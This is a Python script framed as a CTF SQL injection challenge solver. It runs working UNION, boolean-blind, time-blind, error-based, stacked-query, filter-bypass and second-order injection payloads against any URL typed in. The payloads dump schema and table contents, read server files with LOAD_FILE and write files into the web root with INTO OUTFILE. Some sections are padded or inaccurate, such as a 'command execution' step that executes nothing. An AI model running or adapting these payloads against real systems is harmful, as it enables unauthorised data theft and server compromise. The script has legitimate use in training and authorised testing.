#!/usr/bin/env python3
"""
CTF SQL Injection Challenge Solver
Includes solutions for common CTF challenge types
"""

import requests
from urllib.parse import quote
import re
import string
import time

class CTFSQLi:
    """CTF SQL Injection Solver"""

    def __init__(self, url):
        self.url = url
        self.session = requests.Session()

    def basic_sqli(self):
        """Basic SQL injection - Extract data from info_schema"""
        print("\n[*] Basic SQL Injection Solver")

        # 1. Determine column count
        print("[1] Determining column count...")
        for i in range(1, 20):
            payload = f"1' ORDER BY {i}--"
            r = self.session.get(f"{self.url}?id={quote(payload)}")

            if "error" in r.text.lower() or "Unknown" in r.text:
                columns = i - 1
                print(f"    [+] Column count: {columns}")
                break

        # 2. UNION injection to extract data
        print("\n[2] UNION injection to extract data...")

        # Extract database name
        payload = f"-1' UNION SELECT 1,database(),3--"
        r = self.session.get(f"{self.url}?id={quote(payload)}")
        print(f"    Database: {self.extract_from_response(r.text)}")

        # Extract table names
        payload = f"-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"
        r = self.session.get(f"{self.url}?id={quote(payload)}")
        tables = self.extract_from_response(r.text)
        print(f"    Tables: {tables}")

        # Extract column names
        payload = f"-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag'--"
        r = self.session.get(f"{self.url}?id={quote(payload)}")
        columns = self.extract_from_response(r.text)
        print(f"    Columns: {columns}")

        # Extract flag
        payload = f"-1' UNION SELECT 1,flag,3 FROM flag--"
        r = self.session.get(f"{self.url}?id={quote(payload)}")
        flag = self.extract_from_response(r.text)
        print(f"\n    [+] Flag: {flag}")

        return flag

    def blind_sqli_boolean(self):
        """Boolean-based blind injection - Judge by page response"""
        print("\n[*] Boolean-based Blind Injection Solver")

        flag = ""
        chars = string.ascii_letters + string.digits + "_{}"

        # Assume flag format is flag{xxx}
        for i in range(1, 50):
            found = False
            for char in chars:
                payload = f"1' AND SUBSTR((SELECT flag FROM flag LIMIT 1),{i},1)='{char}'--"

                r = self.session.get(f"{self.url}?id={quote(payload)}")

                # Determine if the condition is true (based on page characteristics)
                if self.is_true_condition(r.text):
                    flag += char
                    print(f"    [+] Current progress: {flag}")
                    found = True
                    break

            if not found:
                break

        print(f"\n    [+] Flag: {flag}")
        return flag

    def blind_sqli_time(self):
        """Time-based blind injection - Judge by response time"""
        print("\n[*] Time-based Blind Injection Solver")

        flag = ""
        chars = string.ascii_letters + string.digits + "_{}"

        for i in range(1, 50):
            found = False
            for char in chars:
                payload = f"1' AND IF(SUBSTR((SELECT flag FROM flag LIMIT 1),{i},1)='{char}', SLEEP(3), 0)--"

                start = time.time()
                r = self.session.get(f"{self.url}?id={quote(payload)}")
                elapsed = time.time() - start

                if elapsed > 2:
                    flag += char
                    print(f"    [+] Current progress: {flag}")
                    found = True
                    break

            if not found:
                break

        print(f"\n    [+] Flag: {flag}")
        return flag

    def error_based_sqli(self):
        """Error-based injection - Extract data using error messages"""
        print("\n[*] Error-based Injection Solver")

        # 1. extractvalue() test
        print("[1] Testing extractvalue()...")
        payload = "1' and extractvalue(1,concat(0x7e,(SELECT flag FROM flag LIMIT 0,1),0x7e))--+"
        r = self.session.get(f"{self.url}?id={quote(payload)}")

        if "XPATH syntax error" in r.text:
            match = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<\n]+)', r.text)
            if match:
                flag = match.group(1).replace('~', '')
                print(f"    [+] Flag: {flag}")
                return flag

        # 2. updatexml() test
        print("\n[2] Testing updatexml()...")
        payload = "1' and updatexml(1,concat(0x7e,(SELECT flag FROM flag LIMIT 0,1),0x7e),1)--+"
        r = self.session.get(f"{self.url}?id={quote(payload)}")

        if "XPATH syntax error" in r.text:
            match = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<\n]+)', r.text)
            if match:
                flag = match.group(1).replace('~', '')
                print(f"    [+] Flag: {flag}")
                return flag

        # 3. floor()+rand() test
        print("\n[3] Testing floor()+rand()...")
        payload = "1' and (select 1 from(select count(*),concat((SELECT flag FROM flag LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+"
        r = self.session.get(f"{self.url}?id={quote(payload)}")

        if "Duplicate entry" in r.text:
            match = re.search(r"Duplicate entry '([^']+)'", r.text)
            if match:
                flag = match.group(1).rstrip('01')
                print(f"    [+] Flag: {flag}")
                return flag

        print("[-] Error-based injection failed")
        return None

    def stacked_query_sqli(self):
        """Stacked query injection - Use semicolons to separate multiple statements"""
        print("\n[*] Stacked Query Injection Solver")

        # 1. Attempt to read files
        payload = "1'; SELECT LOAD_FILE('/flag')--"
        r = self.session.get(f"{self.url}?id={quote(payload)}")
        print(f"    File read attempt: {r.text[:200]}")

        # 2. Attempt to write files
        payload = "1'; SELECT 1 INTO OUTFILE '/var/www/html/flag.txt'--"
        r = self.session.get(f"{self.url}?id={quote(payload)}")

        # 3. Attempt to execute system commands (MySQL 5.1+)
        payload = "1'; CREATE TABLE cmd_exec(cmd_output VARCHAR(4096));--"
        r = self.session.get(f"{self.url}?id={quote(payload)}")

        payload = "1'; LOAD DATA INFILE '/tmp/flag' INTO TABLE cmd_exec;--"
        r = self.session.get(f"{self.url}?id={quote(payload)}")

        print("    [+] Stacked query injection completed")
        return None

    def filter_bypass_sqli(self):
        """Filter bypass injection - Bypass keyword and function filtering"""
        print("\n[*] Filter Bypass Injection Solver")

        bypass_methods = {
            "Mixed case": "1' UniOn SeLeCt 1,flag From flag--",
            "Double write": "1' uniunionon selselectect 1,flag from flag--",
            "Hex encoding": "1' union select 1,0x666c61677b746573747d from flag--",
            "Base64 encoding": "1' union select 1,from_base64('ZmxhZ3t0ZXN0fQ==') from flag--",
            "Comment bypass": "1' union select 1,flag%00 from flag--",
            "Space bypass": "1'/**/union/**/select/**/1,flag/**/from/**/flag--",
            "Equivalent replacement": "1' union select 1,flag`from`flag`--",
        }

        for method_name, payload in bypass_methods.items():
            print(f"    Testing: {method_name}")
            r = self.session.get(f"{self.url}?id={quote(payload)}")

            if "flag{" in r.text:
                print(f"        [+] Success! {method_name}")
                return self.extract_from_response(r.text)

        print("[-] All bypass methods failed")
        return None

    def second_order_sqli(self):
        """Second-order injection - Trigger injection using stored data"""
        print("\n[*] Second-order Injection Solver")

        # 1. Register user with payload in username
        payload = "admin' union select 1,flag from flag--"
        register_data = {
            "username": payload,
            "password": "test"
        }

        r = self.session.post(f"{self.url}/register", data=register_data)
        print(f"    [1] Registered user: {payload}")

        # 2. Login
        login_data = {
            "username": "admin",
            "password": "test"
        }

        r = self.session.post(f"{self.url}/login", data=login_data)
        print(f"    [2] Logged in as user")

        # 3. Trigger second-order injection (admin views user list)
        r = self.session.get(f"{self.url}/admin/users")

        if "flag{" in r.text:
            flag = self.extract_from_response(r.text)
            print(f"    [+] Flag: {flag}")
            return flag

        return None

    def waf_bypass_sqli(self):
        """WAF bypass - Use advanced techniques to bypass Web Application Firewalls"""
        print("\n[*] WAF Bypass Solver")

        bypass_methods = {
            "Parameter pollution": "?id=1&union=1&select=flag&from=flag",
            "Chunked transfer": "Set Transfer-Encoding: chunked in HTTP headers",
            "Encoding bypass": "?id=1' UNION SELECT 1,flag FROM flag%23",
            "Inline comments": "?id=1' /*!UNION*/ /*!SELECT*/ 1,flag /*!FROM*/ flag--",
            "Buffer overflow": "?id=1' UNION SELECT 1,flag FROM flag" + "A" * 10000,
        }

        print("    WAF bypass methods:")
        for method_name, payload in bypass_methods.items():
            print(f"        - {method_name}")

        print("\n    [+] WAF bypass strategies ready")
        return None

    def extract_from_response(self, text):
        """Extract flag from response"""
        # Look for flag{} format
        match = re.search(r'flag\{[^}]+\}', text)
        if match:
            return match.group(0)

        # Look for CTF{} format
        match = re.search(r'CTF\{[^}]+\}', text)
        if match:
            return match.group(0)

        # Look for other flag formats
        match = re.search(r'[A-Za-z0-9_{}]+\{[^}]+\}', text)
        if match:
            return match.group(0)

        return text[:100]

    def is_true_condition(self, text):
        """Determine if the page shows a true condition response"""
        # Adjust based on actual page characteristics
        return "success" in text.lower() or "login" in text.lower() or "welcome" in text.lower()


def main():
    """Main function - CTF SQL Injection Challenge Solver"""

    print("""
    ╔═════════════════════════════════════════════════════════╗
    ║         CTF SQL Injection Challenge Solver              ║
    ║             Version 1.0 - 7x24 Learning Mode            ║
    ╚═════════════════════════════════════════════════════════╝
    """)

    url = input("Enter the CTF challenge URL: ").strip()

    if not url:
        print("[-] ❌ No URL provided")
        return

    sqli = CTFSQLi(url)

    print("\n" + "="*60)
    print("Select a solving method:")
    print("="*60)
    print("1. Basic SQL Injection")
    print("2. Boolean-based Blind Injection")
    print("3. Time-based Blind Injection")
    print("4. Error-based Injection")
    print("5. Stacked Query Injection")
    print("6. Filter Bypass Injection")
    print("7. Second-order Injection")
    print("8. WAF Bypass")
    print("9. Auto-try all methods")

    choice = input("\nPlease select (1-9): ").strip()

    results = {}

    if choice == "1":
        flag = sqli.basic_sqli()
        results["Basic SQL Injection"] = flag

    elif choice == "2":
        flag = sqli.blind_sqli_boolean()
        results["Boolean-based Blind Injection"] = flag

    elif choice == "3":
        flag = sqli.blind_sqli_time()
        results["Time-based Blind Injection"] = flag

    elif choice == "4":
        flag = sqli.error_based_sqli()
        results["Error-based Injection"] = flag

    elif choice == "5":
        flag = sqli.stacked_query_sqli()
        results["Stacked Query Injection"] = flag

    elif choice == "6":
        flag = sqli.filter_bypass_sqli()
        results["Filter Bypass Injection"] = flag

    elif choice == "7":
        flag = sqli.second_order_sqli()
        results["Second-order Injection"] = flag

    elif choice == "8":
        flag = sqli.waf_bypass_sqli()
        results["WAF Bypass"] = flag

    elif choice == "9":
        print("\n[*] Auto-trying all methods...")

        # Try in priority order
        methods = [
            ("Basic SQL Injection", sqli.basic_sqli),
            ("Error-based Injection", sqli.error_based_sqli),
            ("Boolean-based Blind Injection", sqli.blind_sqli_boolean),
            ("Time-based Blind Injection", sqli.blind_sqli_time),
            ("Filter Bypass Injection", sqli.filter_bypass_sqli),
            ("Stacked Query Injection", sqli.stacked_query_sqli),
            ("Second-order Injection", sqli.second_order_sqli),
        ]

        for method_name, method_func in methods:
            print(f"\n[*] Trying: {method_name}")
            try:
                flag = method_func()
                if flag and "flag{" in str(flag).lower():
                    results[method_name] = flag
                    print(f"\n[+] ✅ {method_name} succeeded!")
                    print(f"    Flag: {flag}")
                    break
            except Exception as e:
                print(f"    [!] {method_name} failed: {e}")

    print("\n" + "="*60)
    print("Results:")
    print("="*60)
    for method, flag in results.items():
        print(f"{method}: {flag}")

    if results:
        print("\n" + "="*60)
        print("✅ Challenge solved!")
        print("="*60)
    else:
        print("\n" + "="*60)
        print("❌ All methods failed")
        print("="*60)


if __name__ == "__main__":
    main()
